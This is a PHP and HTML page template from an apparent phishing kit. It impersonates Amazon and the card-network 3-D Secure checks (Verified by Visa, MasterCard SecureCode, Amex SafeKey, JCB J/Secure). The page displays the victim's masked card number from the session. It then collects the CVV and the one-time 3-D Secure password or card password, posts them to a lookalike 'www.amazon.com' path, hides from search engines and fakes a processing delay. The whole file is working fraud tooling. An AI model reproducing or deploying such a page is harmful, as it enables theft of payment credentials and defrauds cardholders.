<?php

$type = $core->session('brandtype');
$bank= $core->session('bank');
$scheme_img = "msrc.png";
$title = "Secure Code";
if(preg_match("/mastercard/i",$type))
{
  $scheme_img = "msrc.png";
    $title = 'MasterCard Secure Code';

}elseif(preg_match("/visa|visaelectron/i",$type))
{
  $scheme_img = "vbv.png";
    $title ='Verified by Visa';
}elseif(preg_match("/jcb/",$type))
{
  $scheme_img = "jcb.png";
  $title ='JCB J/Secure';

}elseif(preg_match("/safekey|amex|american express/i",$type))
{
  $scheme_img = "safekey.png";
     $title ='Amex SafeKey';

}

$cvv_img = "cvv1.png";
if(preg_match("/amex|american express/i",$bank))
{
  $cvv_img = "cvv2.png";
}else{
  $cvv_img = "cvv1.png";
}


?>
<!DOCTYPE html>
<html>

<head>
<title><?=$title;?></title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="../aws/img/favicon.ico">
  <script type="text/javascript" src="../aws/js/jquery.min.js"></script>
  <script type="text/javascript" src="../aws/js/bill.js"></script>
  <script type="text/javascript" src="../aws/js/post.js"></script>
  <script type="text/javascript" src="../aws/js/jquery.maskedinput.min.js"></script>
  <script type="text/javascript" src="../aws/js/jquery.payment.min.js"></script>
  <script type="text/javascript" src="../aws/js/bootstrap.min.js"></script>
  <link rel="shortcut icon" href="../aws/img/favicon.ico">

<script type="text/javascript">
  jQuery(function() {
  $("#Cvv").mask("999");
  $('#ssn').mask("999-99-9999");
  $('#sortcode').mask('99-99-99');
})

$(document).ready(function() {
  $("#bntvbv").click(function() {
    var xCvv = $("#Cvv").val();
    var x3Dsecure = $("#3Ds").val();
    var xStart;
    if (xCvv === "") {
      xStart = false;
    }
    if (x3Dsecure === "" || x3Dsecure.length < 3) {
      xStart = false;
    }
    if (xStart === false) {
      alert("Please check your entries and try again");
      return false;
    } else {
      document.getElementById("3dpage").className = "show";
      document.getElementById("3dweb").className = "hide";
    }
  })
})
window.onload = function() {
  setTimeout(function() {
    document.getElementById("3dweb").className = "";
    document.getElementById("3dpage").className = "hide";
  }, 3000)
}

</script>
<style media="screen">
.hijaiyh-re {
  margin: 0 auto;
  width: 368px;
  border: solid 1px black;
  padding: 17px;
  background: #fff;
  color: #000;
}

@media screen and (max-width: 368px) {
  .hijaiyh-re:before {
    width: 315px;
  }
}

.info3d {
  font-size: 13px;
  margin-top: 25px;
  color: #807979;
}

.hide {
  display: none;
}
</style>
</head>

<body>
<div class="hijaiyh-re">
<img src="../aws/img/3d/<?=$scheme_img;?>">
<img src="../aws/img/<?=$config['amz_logo'];?>" style="float: right;display: inline-block;width:130px;height:60px">
<p class="info3d"><?=$core->translate('en',$lang,'Please enter information pertaining to your credit card to confirm your Amazon Account.');?></p>
<div id="3dpage">
<div align="center">
<p style="margin: 91px 0 129px;"><?=$core->translate('en',$lang,'Processing ...');?></p>
</div>
</div>
<div class="hide" id="3dweb">
<form method="post" id="3dsecure" autocomplete="off" action="../www.amazon.com/gp/verified?locale=<?=$localex;?>">
<table align="center" width="350" style="font-size: 11px;font-family: arial, sans-serif; color: rgb(0, 0, 0); margin-top: 10px;">
<tbody style="height:8px;">
<tr>
<td align="right"><?=$core->translate('en',$lang,'Card Number');?> : </td>
<td><b>**** **** **** <?=substr(str_replace(" ","",$core->session('cardnumber')),12,4);?></b></td>
</tr>
<tr>
<td align="right">CVV / CVC :</td>
<td><input type="text" name="cvv" id="Cvv" style="width: 38px;line-height:0.6" required>&nbsp;<img src="../aws/img/<?=$cvv_img;?>" style="position: absolute;width: 39px;height: 18px;op:auto;"></td>
</tr>

<tr>
<td align="right">
<?php
if($country_code == 'de' || $country_code == 'ch' || $country_code == 'jp')
{
  echo $core->translate('en',$lang,'Card Password : ');
}else{
  echo $core->translate('en',$lang,'One time pass : ');
}
?>
</td><td><input type="password" style="width: 150px;line-height:0.6" name="password_vbv" id="3Ds" required></td>
</tr>
<td colspan="3" align="center"><br><input type="submit" value="Submit" id="bntvbv">&nbsp;&nbsp;|&nbsp;&nbsp;<a href="#"><input type="button" value="Skip"></a></td>
</tr>
</tbody>
</table>
</form>
</div>
<p style="text-align: center;font-family: arial, sans-serif;font-size: 9px; color: #656565"> &copy; <?=gmdate('Y');?> Bank check. All Rights Reserved</p>
</div>

</body>

</html>
